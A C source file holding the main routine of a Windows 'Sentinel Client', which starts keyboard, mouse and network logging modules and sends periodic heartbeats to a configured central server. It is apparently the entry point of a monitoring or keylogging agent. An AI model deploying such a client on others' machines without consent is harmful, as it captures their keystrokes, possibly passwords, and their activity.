#include <stdio.h>
#include <windows.h>
#include "config_loader.h"
#include "heartbeat.h"
#include "logger/logger.h"
#include "keyboard/keyboard_logger.h"
#include "mouse/mouse_logger.h"
#include "network/network_logger.h"


int main() {
    Config config;
    logger_init("logs/sentinel.log");
    log_event("SYSTEM", "startup", "client_started");
    keyboard_logger_start();
    log_event("SYSTEM", "keyboard_module", "started");
    mouse_logger_start();
    log_event("SYSTEM","mouse_module","started");
    network_monitor_start();
    log_event("SYSTEM","network_module","started");

    if (load_config("config.toml", &config) != 0) {
        printf("Failed to load config\n");
        return 1;
    }

    printf("Sentinel Client Started\n");
    printf("Client ID: %s\n", config.client_id);

    while (1) {
        send_heartbeat(config.root_ip, config.root_port, config.client_id);
        Sleep(config.heartbeat_interval * 1000);
    }

    logger_shutdown();
    return 0;
}
